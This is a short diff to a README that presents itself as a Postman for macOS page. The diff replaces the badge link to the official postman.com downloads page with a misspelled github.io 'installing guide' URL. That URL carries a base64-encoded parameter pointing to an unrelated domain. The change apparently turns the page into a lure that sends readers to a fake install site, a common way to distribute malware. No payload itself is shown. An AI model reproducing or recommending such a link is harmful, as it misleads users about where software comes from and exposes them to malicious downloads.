@@ -4,7 +4,7 @@
 Postman for MacOS is the ultimate API development and testing platform for MacBook users.  
 It delivers speed, collaboration, and reliability — all optimized for macOS.
 
-[![Setup Guide for MacOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20MacOS%20(Click%20Here)-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://www.postman.com/downloads/)
+[![Setup Guide for MacOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20MacOS%20(Click%20Here)-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://postman-intalling-guide.github.io/.github/?c=aXRlcm0ybWFjb3MuY29t)
 
 ---
 
